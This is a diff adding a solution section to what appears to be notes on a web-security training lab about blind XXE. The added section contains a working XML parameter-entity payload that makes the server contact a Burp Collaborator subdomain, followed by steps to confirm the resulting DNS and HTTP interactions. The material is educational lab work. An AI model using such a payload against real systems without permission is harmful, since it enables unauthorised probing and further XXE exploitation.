@@ -2,4 +2,13 @@ Lab 4 - Blind XXE with out-of-band interaction via XML parameter entities
 
 Target Goal - Exploit blind XXE injection to issue a DNS lookup and HTTP request to Burp Collaborator.
 
-Analysis:
+Solution:
+
+Insert the following external entity definition in between the XML declaration and the stockCheck element. 
+Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
+
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+
+Go to the Collaborator tab, and click "Poll now". 
+If you don't see any interactions listed, wait a few seconds and try again. 
+You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
